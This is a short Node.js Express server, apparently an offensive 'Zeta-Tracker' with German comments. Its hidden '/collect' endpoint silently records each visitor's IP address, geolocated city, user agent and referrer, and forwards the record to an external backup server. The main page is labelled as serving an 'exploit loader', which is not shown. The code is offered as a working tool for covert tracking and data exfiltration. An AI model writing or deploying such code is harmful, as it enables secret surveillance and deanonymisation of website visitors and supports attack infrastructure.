const express = require('express');
const path = require('path');
const fs = require('fs');
const geoip = require('geoip-lite');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000; // Render bevorzugt Port 10000

// Middleware für IP-Erkennung (wichtig hinter Proxy)
app.set('trust proxy', true);

// Tracking-Endpoint (unsichtbar)
app.get('/collect', (req, res) => {
    const ip = req.ip;
    const geo = geoip.lookup(ip);
    const userAgent = req.headers['user-agent'];
    
    const data = {
        timestamp: new Date(),
        ip: ip,
        userAgent: userAgent,
        estimatedLocation: geo ? `${geo.city}, ${geo.country}` : "Unknown",
        referrer: req.headers['referer'] || "Direct"
    };

    // Lokal speichern
    fs.appendFileSync('tracking.log', JSON.stringify(data) + '\n');

    // Optional: Daten an zweiten Server schicken
    fetch('https://dein-backup-server.xyz/log', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' }
    });

    res.sendStatus(204); // Unsichtbare Antwort
});

// Hauptseite mit Exploit-Loader
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`Zeta-Tracker läuft auf Port ${PORT} 🏴‍☠️`));
